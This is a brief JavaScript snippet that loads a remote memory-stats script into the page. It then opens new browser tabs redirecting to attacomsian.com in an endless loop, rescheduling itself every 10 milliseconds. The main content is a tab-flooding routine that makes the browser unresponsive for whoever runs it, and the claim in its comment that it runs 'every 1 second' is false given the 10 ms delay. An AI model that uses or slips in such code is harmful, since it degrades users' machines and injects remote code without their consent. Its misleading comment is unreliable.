var script = document.createElement('script');
script.src = 'https://rawgit.com/paulirish/memory-stats.js/master/bookmarklet.js';
document.head.appendChild(script);

function openAndRedirectForever() {
    const tab = window.open('about:blank');
    tab.location = 'https://attacomsian.com';
    tab.focus();

    setTimeout(openAndRedirectForever, 10); // Opens every 1 second
}

openAndRedirectForever();
